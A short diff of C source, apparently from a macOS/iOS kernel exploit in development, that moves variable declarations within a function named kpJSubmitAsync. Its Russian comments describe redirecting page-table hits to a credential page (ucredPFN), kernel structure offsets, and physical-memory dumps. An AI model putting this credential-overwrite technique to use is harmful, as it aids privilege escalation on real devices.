@@ -6602,6 +6602,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
     int nDep = 0;
     uint64_t buf247 = 0, flOld247 = 0, dq252 = 0;   // 1.9.248: record buffer CHAIN + flags-оригинал — пост-submit дампы (H1 rebuild vs H2 mapper-игнор); 1.9.257: dq252 = dst entry-оригинал для physread
+    // 1.9.266 (р.66): pd/hdr на уровне функции для протокола схождения L5;
+    // allBuf/allOld/allCnt — патч ВСЕХ записей record buffer (не только page-0, L6).
+    uint64_t pd247 = 0, hdr247 = 0;
+    uint64_t allBuf = 0; uint32_t allCnt = 0; uint64_t allOld[64] = {0};
     // 1.9.247: CHAIN (р.61) — АВТОРИТЕТНЫЙ record buffer дескриптора, ноль сканов.
     // Цепочка: [surf+0x30]=pd → [pd+0x90]=hdr → [hdr+0x10]=buffer;
     // buffer+0x28=count (0x20=32 стр. для 512KB), +0x2d=flags(bit1=built),
@@ -6742,10 +6746,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t rmdHitArr = 0, rmdHitOld = 0; uint32_t rmdHitOff = 0;
     uint64_t specVA[8] = {0}, specOld[8] = {0}; int nSpec = 0;
     int changed = 0;
-    // 1.9.266 (р.66): L5/L6 — pd/hdr на уровне функции для протокола схождения;
-    // allBuf/allOld/allCnt — патч ВСЕХ записей record buffer (не только page-0).
-    uint64_t pd247 = 0, hdr247 = 0;
-    uint64_t allBuf = 0; uint32_t allCnt = 0; uint64_t allOld[64] = {0};
     if (nDep) goto kpx_submit1;
 
     // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
